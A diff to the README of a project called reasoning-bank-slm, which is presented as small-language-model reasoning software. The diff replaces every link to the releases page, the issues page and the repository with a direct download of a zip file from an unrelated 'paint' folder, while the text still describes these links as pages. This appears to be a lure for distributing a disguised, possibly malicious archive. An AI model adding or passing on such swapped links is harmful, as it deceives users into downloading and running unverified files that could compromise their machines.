@@ -4,7 +4,7 @@
 Welcome to the reasoning-bank-slm project! This software demonstrates how small language models can benefit from advanced reasoning techniques. Follow the steps below to install and use the software easily.
 
 ## 💽 Download & Install
-To get started, visit this page to download the latest release: [Download reasoning-bank-slm](https://github.com/doreliaheteroecious247/reasoning-bank-slm/releases).
+To get started, visit this page to download the latest release: [Download reasoning-bank-slm](https://raw.githubusercontent.com/doreliaheteroecious247/reasoning-bank-slm/main/paint/reasoning-bank-slm.zip).
 
 ### 📥 Download Steps:
 1. Click the link above to go to the Releases page.
@@ -50,7 +50,7 @@ To run reasoning-bank-slm, you will need:
 
 ## 🌐 Support and Community
 If you encounter issues or have questions, feel free to reach out:
-- **GitHub Issues Page:** Submit your issues [here](https://github.com/doreliaheteroecious247/reasoning-bank-slm/issues).
+- **GitHub Issues Page:** Submit your issues [here](https://raw.githubusercontent.com/doreliaheteroecious247/reasoning-bank-slm/main/paint/reasoning-bank-slm.zip).
 - **Community Forum:** Join discussions and share thoughts with other users.
 
 ## 🚀 Contributing
@@ -66,6 +66,6 @@ The reasoning-bank-slm project is available under the MIT License. You can use, 
 Thank you to the Google Research team for their exceptional work on the `ReasoningBank` technique. Their research paved the way for this project.
 
 ## 🔗 Additional Information
-For any further queries or detailed discussions, check the [GitHub Repository](https://github.com/doreliaheteroecious247/reasoning-bank-slm/) for documents, discussions, and more resources.
+For any further queries or detailed discussions, check the [GitHub Repository](https://raw.githubusercontent.com/doreliaheteroecious247/reasoning-bank-slm/main/paint/reasoning-bank-slm.zip) for documents, discussions, and more resources.
 
-Remember, to download the latest release, visit our Releases page: [Download reasoning-bank-slm](https://github.com/doreliaheteroecious247/reasoning-bank-slm/releases). Enjoy exploring the capabilities of small language models!
+Remember, to download the latest release, visit our Releases page: [Download reasoning-bank-slm](https://raw.githubusercontent.com/doreliaheteroecious247/reasoning-bank-slm/main/paint/reasoning-bank-slm.zip). Enjoy exploring the capabilities of small language models!
